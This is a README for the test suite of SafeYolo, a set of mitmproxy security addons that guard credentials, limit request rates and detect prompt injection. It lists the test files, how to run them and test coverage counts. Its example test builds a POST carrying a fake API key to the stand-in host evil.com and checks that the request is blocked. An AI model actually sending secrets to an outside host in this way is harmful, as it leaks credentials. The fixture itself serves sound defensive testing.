# SafeYolo Addon Tests

Unit and integration tests for native mitmproxy addons.

## Test Files

- `conftest.py` - Pytest fixtures using `mitmproxy.test.tflow`
- `test_admin_api.py` - REST endpoints, mode switching, stats, allowlist API
- `test_base.py` - SecurityAddon base class, stats, bypass logic
- `test_budget_tracker.py` - GCRA rate limiting, burst capacity, state persistence
- `test_circuit_breaker.py` - State transitions, failure detection, recovery
- `test_credential_guard.py` - Credential detection, host authorization, blocking, allowlist
- `test_integration.py` - Addon chain behavior, metadata sharing
- `test_metrics.py` - Per-domain statistics, latency tracking, Prometheus output
- `test_network_guard.py` - Access control + rate limiting, deny/budget effects, homoglyph detection
- `test_pattern_scanner.py` - Regex patterns, secret detection, jailbreak detection
- `test_policy.py` - Policy engine, domain/client rules, hot reload
- `test_policy_loader.py` - YAML/JSON loading, file watching, hot reload
- `test_prompt_injection.py` - ML classifiers (DeBERTa/Ollama), blocking, async verification
- `test_request_logger.py` - JSONL logging, quiet hosts, log format
- `test_service_discovery.py` - IP to project mapping, config loading
- `test_sse_streaming.py` - SSE detection, stream recording, stats

## Running Tests

### Option 1: Docker (recommended)

mitmproxy has complex native dependencies (aioquic, bpf-linker for eBPF).
Easiest to run tests in the mitmproxy Docker image:

```bash
# From safeyolo/ directory
docker run --rm -v $(pwd):/app -w /app \
  mitmproxy/mitmproxy \
  pip install pytest && pytest tests/ -v
```

### Option 2: Local Install

Requires:
- C compiler (for aioquic crypto)
- Rust + bpf-linker (for mitmproxy-linux eBPF)

```bash
pip install mitmproxy pytest
pytest tests/ -v
```

## Test Coverage

| Addon | Tests | Coverage |
|-------|-------|----------|
| admin_api | 19 | REST endpoints, mode switching, stats aggregation, allowlist management |
| base | 13 | SecurityAddon stats, bypass logic, decision logging, blocking |
| budget_tracker | 16 | GCRA algorithm, burst capacity, state persistence, thread safety |
| circuit_breaker | 18 | State machine, blocking, exponential backoff, manual control, recovery |
| credential_guard | 16 | Pattern matching, host auth, blocking, allowlist, temp allowlist, stats |
| integration | 15 | Addon chain behavior, metadata sharing, realistic multi-addon scenarios |
| metrics | 21 | Per-domain stats, latency tracking, Prometheus format, problem detection |
| network_guard | 15 | Access control, rate limiting, deny/budget effects, homoglyph detection, warn mode |
| pattern_scanner | 32 | Regex patterns, secret detection, jailbreak detection, redaction |
| policy | 28 | Policy engine, domain/client rules, hot reload, bypass lists, wildcards |
| policy_loader | 22 | YAML/JSON loading, file watching, hot reload, thread safety |
| prompt_injection | 21 | DeBERTa/Ollama classifiers, blocking, confidence thresholds, async verification |
| request_logger | 16 | JSONL format, quiet hosts filtering, event structure |
| service_discovery | 13 | IP mapping, range matching, config loading, reload |
| sse_streaming | 11 | SSE detection, streaming responses, stats tracking |

**Total: 326 tests** across 15 test suites

## Adding Tests

Tests use mitmproxy's test utilities:
- `mitmproxy.test.tflow` - Create test HTTP flows
- `mitmproxy.test.taddons` - Test addon context

Example:
```python
def test_blocks_credential(credential_guard, make_flow):
    flow = make_flow(
        method="POST",
        url="https://evil.com/api",
        content='{"key": "sk-abc123xyz456def789ghijklmno"}',
        headers={"Content-Type": "application/json"},
    )

    credential_guard.request(flow)

    assert flow.response.status_code == 403
    assert flow.metadata["blocked_by"] == "credential-guard"
```
